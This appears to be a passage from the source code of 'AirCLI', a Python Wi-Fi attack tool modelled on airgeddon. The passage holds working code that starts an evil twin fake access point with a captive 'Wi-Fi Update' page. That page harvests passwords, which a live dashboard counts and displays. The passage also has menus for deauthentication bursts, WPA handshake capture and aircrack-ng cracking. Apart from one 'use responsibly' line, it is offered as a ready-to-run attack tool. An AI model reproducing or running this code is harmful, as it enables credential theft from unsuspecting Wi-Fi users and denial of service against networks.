                line = hp.stdout.readline()
                if not line: break
                early += line
            if early.strip():
                print(colorize("  hostapd early output:", 'warn'))
                print(early.strip()[:400])
    except:
        pass

    if hp.poll() is None:
        print(colorize("  ✓ hostapd still running after start", 'success'))
    else:
        error("  hostapd has died after start!")

    print()
    print(colorize("  Quick local check you can run in another terminal:", 'info'))
    print(colorize(f"    sudo iw dev {iface} info", 'clean'))
    print(colorize(f"    sudo iw dev {iface} station dump", 'clean'))
    print(colorize("  On your phone: pull down WiFi list and look for the SSID (may take 10-30s).", 'info'))
    print(colorize("  If still not visible: try a different channel (1-11), different USB adapter, or `sudo rfkill unblock wifi`.", 'warn'))

    if with_captive:
        show_step("Starting captive portal (Wi-Fi Update page)", step='CAPTIVE')
        write_portal_server(essid, listen_port=80)
        portal = subprocess.Popen(['python3', STATE.portal_script], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        STATE.active_procs.append(portal)

        # Thread to surface captured creds live
        def tail_creds():
            last_size = 0
            while True:
                try:
                    if os.path.exists(STATE.captive_log):
                        sz = os.path.getsize(STATE.captive_log)
                        if sz > last_size:
                            with open(STATE.captive_log) as ff:
                                ff.seek(last_size)
                                for line in ff:
                                    if line.strip():
                                        log(line.strip(), 'CAPTIVE')
                            last_size = sz
                    if portal and portal.stdout:
                        line = portal.stdout.readline()
                        if line and 'CAPTIVE' in line:
                            log(line.strip(), 'CAPTIVE')
                except:
                    pass
                time.sleep(0.8)
                if portal.poll() is not None:
                    break
        th = threading.Thread(target=tail_creds, daemon=True)
        th.start()
        success("Captive portal ACTIVE. Default: Wi-Fi Update page. Creds logged.")
        log(f"Creds file: {STATE.captive_log}", 'INFO')
        print(colorize("\n[EVIL] Clients connecting to the fake AP will be redirected to the login page.", 'captive'))
        print(colorize("Monitor this terminal for captured credentials in real time.", 'captive'))
    return True

def stop_fake_ap():
    log("Stopping Fake AP / Captive components...", 'CLEAN')
    for p in list(STATE.active_procs):
        try:
            kill_proc(p)
        except:
            pass
    STATE.active_procs.clear()
    try:
        run_cmd(['pkill', '-9', '-f', 'hostapd'], timeout=5)
        run_cmd(['pkill', '-9', '-f', 'dnsmasq'], timeout=5)
        run_cmd(['iptables', '-t', 'nat', '-F'], timeout=5)
        run_cmd(['iptables', '-F'], timeout=5)
    except:
        pass
    success("Fake AP stopped.")

def get_connected_clients(iface):
    """Try to count associated clients using iw station dump."""
    try:
        rc, out, _ = run_cmd(['iw', 'dev', iface, 'station', 'dump'], timeout=4)
        if rc == 0 and out:
            return out.lower().count('station ')
        return 0
    except Exception:
        return 0

def check_interface_ap_support(iface):
    """Check if interface supports AP mode."""
    try:
        rc, out, _ = run_cmd(['iw', 'dev', iface, 'info'], timeout=3)
        # Find phy
        phy = None
        for line in out.split('\n'):
            if 'wiphy' in line:
                phy = line.strip().split()[-1]
                break
        if not phy:
            return False, "Could not determine PHY"
        rc2, phyout, _ = run_cmd(['iw', 'phy' + phy, 'info'], timeout=3)
        if 'AP' in phyout:
            return True, ""
        return False, "This interface's PHY does not list 'AP' in supported modes"
    except Exception as e:
        return False, str(e)

def evil_twin_flow():
    clear_screen()
    print(colorize("\n=== EVIL TWIN + CAPTIVE PORTAL ===", 'evil', bold=True))
    print(colorize("Create a fake AP. Choose name/channel. Default captive = 'WiFi Update' asking for creds.", 'info'))

    use_target = False
    if STATE.target:
        ans = prompt(f"Clone current target '{STATE.target.get('essid')}' ? (y/N)")
        use_target = ans.lower().startswith('y')

    if use_target and STATE.target:
        essid = STATE.target['essid']
        ch = int(STATE.target.get('ch', 6))
        bssid = STATE.target.get('bssid')
    else:
        essid = prompt("Fake AP name (ESSID)")
        ch = int(prompt("Channel (1-11 typical)") or "6")
        bssid = prompt("BSSID to spoof (optional, leave blank)") or None

    with_capt = True

    # Let user pick the interface for the Fake AP (very important for success)
    print()
    print(colorize("!!! CRITICAL: CHOOSE YOUR USB WIFI ADAPTER (BASE NAME, NOT *mon) !!!", 'error', bold=True))
    print(colorize("PC internal cards almost never work for Fake AP.", 'warn'))
    print(colorize("External USB adapters work best. Pick the BASE name (e.g. wlan1, NOT wlan1mon).", 'warn'))
    print(colorize("If your USB is in monitor mode, pick the non-mon version if shown.", 'info'))
    print()
    log("Available interfaces:", 'EVIL')
    ifaces = list_interfaces()
    for idx, i in enumerate(ifaces, 1):
        hint = i.get('hint', '')
        print(f"  {idx}) {i['name']} [{i.get('mode','?')}] {hint}")
    print("  0) Use auto (best non-monitor)")

    ap_iface = None
    try:
        choice = prompt("Interface # for Fake AP").strip()
        if choice != '0' and choice:
            n = int(choice)
            if 1 <= n <= len(ifaces):
                ap_iface = ifaces[n-1]['name']
    except:
        pass

    if not ap_iface:
        ap_iface = STATE.iface if STATE.iface and not str(STATE.iface).endswith('mon') else STATE.mon_iface

    # IMPORTANT: Never use monitor interface for hostapd. Convert to base.
    if ap_iface and ap_iface.endswith('mon'):
        base = ap_iface[:-3]
        print(colorize(f"  Note: Monitor interface {ap_iface} selected for AP. Switching to base {base}...", 'warn'))
        run_cmd(['airmon-ng', 'stop', ap_iface])
        ap_iface = base
        STATE.mon_iface = None
        STATE.iface = base

    # Check support
    supported, msg = check_interface_ap_support(ap_iface)
    if not supported:
        print(colorize(f"  WARNING: {msg}", 'warn'))
        print(colorize("  Fake AP may not broadcast. Use a proper USB AP-capable adapter.", 'warn'))
    else:
        print(colorize("  ✓ Interface reports AP support", 'success'))

    log(f"Launching on iface: {ap_iface}", 'EVIL')

    iface_choice = ap_iface

    launch_fake_ap(essid, channel=ch, bssid=bssid, with_captive=with_capt, iface=ap_iface)

    # Always show the interactive Evil Twin screen (even if launch had issues, diagnostics were printed)
    clear_screen()

    def _count_creds():
        try:
            if os.path.exists(STATE.captive_log):
                with open(STATE.captive_log) as f:
                    return len([l for l in f if "PASS:" in l])
        except:
            pass
        return 0

    start_time = time.time()

    while True:
            clear_screen()
            uptime = int(time.time() - start_time)
            clients = get_connected_clients(iface_choice)
            creds_count = _count_creds()

            # Dashboard header - AP name towards top right with channel etc.
            cols = shutil.get_terminal_size((80, 24)).columns
            left = colorize("AirCLI - Evil Twin", 'evil', bold=True)
            right = colorize(f"{essid}  |  CH {ch}  |  {iface_choice}", 'target')
            pad = max(2, cols - len(left) - len(right))
            print(left + " " * pad + right)
            print(colorize("=" * min(cols, 100), 'clean'))

            # Status block
            print(colorize(f"  RUNTIME: {uptime//60:02d}:{uptime%60:02d}", 'info'))
            status = f"  STATUS : Running  |  Clients: {clients}  |  Creds Captured: {creds_count}"
            print(colorize(status, 'success' if clients > 0 or creds_count > 0 else 'capture'))

            if clients > 0:
                print(colorize("  >>> Someone is connected to the Fake AP!", 'error'))
            if creds_count > 0:
                print(colorize(f"  >>> {creds_count} credential(s) submitted via captive portal!", 'captive'))

            print()
            print(colorize("  [1] Send deauth burst (force clients off real AP)", 'attack'))
            print(colorize("  [2] View captured credentials", 'captive'))
            print(colorize("  [3] Stop Fake AP and return to menu", 'clean'))
            print()

            opt = prompt("Choice (1/2/3 or q to quit)").strip().lower()
            if opt in ('1',):
                if STATE.target:
                    deauth_attack(count=20)
                else:
                    warn("No target set for deauth. Set target first for best results.")
                time.sleep(1)
            elif opt in ('2',):
                if os.path.exists(STATE.captive_log):
                    with open(STATE.captive_log) as f:
                        print(colorize("\n=== CAPTURED CREDS ===", 'captive'))
                        print(f.read())
                else:
                    print("No credentials captured yet.")
                pause()
            elif opt in ('3', 'q', 'quit'):
                stop_fake_ap()
                break
            else:
                print("Invalid choice.")

# ============== MENUS ==============
def interface_menu():
    while True:
        clear_screen()
        print(colorize("\n--- Interface Management ---", 'header'))
        print("1) List interfaces")
        print("2) Select interface")
        print("3) Enable MONITOR mode")
        print("4) Restore MANAGED mode")
        print("5) Show current state")
        print("0) Back")
        ch = prompt("Select")
        if ch == '1':
            ifs = list_interfaces()
            for i in ifs:
                hint = i.get('hint', '')
                print(f"  {i['name']}  mode:{i.get('mode')} {hint}")
            pause()
        elif ch == '2':
            select_interface()
        elif ch == '3':
            set_monitor_mode()
        elif ch == '4':
            set_managed_mode()
        elif ch == '5':
            print(f"Interface: {STATE.iface} | Monitor: {STATE.mon_iface}")
            print(f"Target: {STATE.target}")
            pause()
        elif ch == '0':
            break

def discovery_menu():
    while True:
        clear_screen()
        print(colorize("\n--- Discovery ---", 'scan'))
        print("1) Quick scan (12s)")
        print("2) Longer scan (25s)")
        print("3) Show last scan results")
        print("4) Select / set target from results")
        print("0) Back")
        ch = prompt("Select")
        if ch == '1':
            aps = scan_networks(12)
            display_networks(aps)
            pause()
        elif ch == '2':
            aps = scan_networks(25)
            display_networks(aps)
            pause()
        elif ch == '3':
            aps = parse_airodump_csv(STATE.scan_csv) if STATE.scan_csv else []
            display_networks(aps)
            pause()
        elif ch == '4':
            aps = parse_airodump_csv(STATE.scan_csv) if STATE.scan_csv else []
            select_target(aps)
        elif ch == '0':
            break

def attack_menu():
    while True:
        clear_screen()
        print(colorize("\n--- Attacks & Captures ---", 'attack'))
        tname = STATE.target['essid'] if STATE.target else "NONE"
        print(f"Current target: {tname}")
        print("1) Capture WPA/WPA2 Handshake (airodump + automatic deauth to force handshake)")
        print("2) Send Deauth (DoS) - push clients off real AP")
        print("3) Verify handshake in capture file")
        print("4) Crack handshake (aircrack-ng + wordlist)")
        print("5) Quick deauth burst (10 pkts)")
        print("0) Back")
        ch = prompt("Select")
        if ch == '1':
            capture_handshake()
        elif ch == '2':
            deauth_attack(20)
        elif ch == '3':
            if os.path.exists(STATE.handshake_cap):
                rc, out, _ = run_cmd(['aircrack-ng', STATE.handshake_cap, '-b', STATE.target['bssid'] if STATE.target else ''], timeout=6)
                print(out)
            else:
                warn("No cap file.")
            pause()
        elif ch == '4':
            crack_handshake()
        elif ch == '5':
            deauth_attack(10)
        elif ch == '0':
            break

def fake_ap_menu():
    while True:
        clear_screen()
        print(colorize("\n--- Fake AP / Evil Twin ---", 'evil'))
        print("1) Simple Fake AP (no captive)")
        print("2) Evil Twin + Captive Portal  (DEFAULT: WiFi Update login page)")
        print("3) Stop running Fake AP / Captive")
        print("4) View captured creds log")
        print("0) Back")
        ch = prompt("Select")
        if ch == '1':
            essid = prompt("ESSID for fake AP")
            chn = int(prompt("Channel") or "6")
            launch_fake_ap(essid, channel=chn, with_captive=False)
            pause()
            stop_fake_ap()
        elif ch == '2':
            evil_twin_flow()
        elif ch == '3':
            stop_fake_ap()
        elif ch == '4':
            if os.path.exists(STATE.captive_log):
                print(open(STATE.captive_log).read())
            else:
                print("No log yet.")
            pause()
        elif ch == '0':
            break

def main_menu():
    clear_screen()
    banner()
    if not is_root():
        warn("Not running as root. Many features will fail. Use: sudo python3 aircli.py")
    check_deps()

    first_draw = True
    while True:
        if not first_draw:
            clear_screen()
        else:
            first_draw = False
        print(colorize("\n" + "="*50, 'clean'))
        print(colorize("MAIN MENU", 'header', bold=True))
        tgt = STATE.target['essid'] if STATE.target else "None"
        print(f"Target: {colorize(tgt, 'target')}   Iface: {STATE.iface or '-'}  Mon: {STATE.mon_iface or '-'}")
        print()
        print("1) Interface Management")
        print("2) Network Discovery / Scan")
        print("3) Set / View Target")
        print("4) Handshake + Deauth Attacks")
        print("5) Fake AP + Evil Twin + Captive Portal")
        print("6) Cleanup (stop everything)")
        print("7) About / Help")
        print("0) Exit")
        choice = prompt("Choose option")

        if choice == '1':
            interface_menu()
        elif choice == '2':
            discovery_menu()
        elif choice == '3':
            aps = parse_airodump_csv(STATE.scan_csv) if STATE.scan_csv else []
            select_target(aps if aps else None)
            pause()
        elif choice == '4':
            attack_menu()
        elif choice == '5':
            fake_ap_menu()
        elif choice == '6':
            cleanup_all()
        elif choice == '7':
            clear_screen()
            print(colorize("\nAirCLI - lightweight airgeddon-style tool", 'info'))
            print("Core flow: Select iface -> Monitor -> Scan -> Target -> Capture/Attack or FakeAP+Captive")
            print("Fake AP + Captive: Creates open rogue AP + redirects all DNS/HTTP to a WiFi Update credential harvester.")
            print("Captured passwords saved to /tmp/aircli_captured_creds.txt")
            print("Use responsibly and only on networks you own or have authorization to test.")
            pause()
        elif choice == '0':
            try:
                cleanup_all(kill_mon=True)
            except Exception as e:
                print(colorize(f"Cleanup had issues (may need reboot): {e}", 'warn'))
            print(colorize("Goodbye.", 'clean'))
            sys.exit(0)
        else:
            print("Invalid choice.")

def main():
    # graceful exit
    def sig_handler(sig, frame):
        print()
        try:
            cleanup_all(kill_mon=True)
        except:
            pass
        sys.exit(0)
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    try:
        main_menu()
    except KeyboardInterrupt:
        try:
            cleanup_all(kill_mon=True)
        except:
            pass

if __name__ == "__main__":
    main()
